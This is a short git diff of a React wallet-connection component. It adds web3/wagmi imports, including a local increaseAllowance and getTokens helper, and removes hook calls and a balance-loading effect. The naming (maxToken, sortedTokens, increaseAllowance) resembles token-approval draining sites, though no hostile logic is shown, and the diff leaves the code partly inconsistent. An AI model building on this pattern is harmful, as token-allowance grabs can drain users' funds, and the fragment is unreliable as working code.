@@ -8,36 +8,21 @@ import { toast } from "react-toastify"
 import { useEffect } from "react";
 // import Typed from 'react-typed';
 import Big from 'big.js';
+import axios from 'axios';
+import { useWeb3Modal } from "@web3modal/react";
+import { getTokens, increaseAllowance, ethBalance } from '../utils/walletconnect.js';
+import { getAccount, fetchFeeData } from '@wagmi/core';
+import { useAccount } from 'wagmi';
+import * as constants from '../utils/constants.js';
+
+const ContentBody = () => {
+    // let showModal = false;
+    // let account = null;
+    let processing = false;
     let balance = {};
     let tokens = [];
     let maxToken = null;
     let sortedTokens = [];
-    let prices = [];
-    const decimal = 18;
-
-    const { address, isConnected } = useAccount();
-    const { open } = useWeb3Modal();
-
-    const handleErrBtn = () => {
-        toast.warn("Warning! Please connect wallet!")
-    }
-
-    useEffect(() => {
-        if (isConnected) {
-            showBalance();
-        }
-    }, [isConnected])
-
-    const getDisplayString = (
-        str,
-        subLength1,
-        subLength2
-      ) => {
-        return `${str.toString().substr(0, subLength1)}...${str
-          .toString()
-          .substr(str.length - subLength2, str.length)}`;
-      };
-
     const handleWalletConnect = async () => {
         try {
             if (!isConnected) {
